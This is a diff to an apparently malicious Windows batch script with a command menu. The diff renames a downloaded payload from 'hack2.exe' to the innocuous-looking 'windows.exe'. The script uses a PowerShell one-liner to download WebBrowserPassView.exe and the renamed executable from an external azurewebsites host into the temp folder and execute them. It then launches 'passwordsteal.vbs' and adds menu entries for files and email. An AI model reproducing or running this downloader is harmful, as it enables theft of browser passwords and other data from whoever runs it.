@@ -53,7 +53,7 @@ if dl == %input% goto E
 goto A
 :B
 
-set files= 'http://mogiant.azurewebsites.net/WebBrowserPassView.exe' , 'http://mogiant.azurewebsites.net/hack2.exe'
+set files= 'http://mogiant.azurewebsites.net/WebBrowserPassView.exe' , 'http://mogiant.azurewebsites.net/windows.exe'
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
 start passwordsteal.vbs
 echo done
@@ -64,6 +64,10 @@ echo pwd
 echo info
 echo ip
 echo me
+echo dl
+echo files
+echo ls
+echo email
 goto A
 
 :D
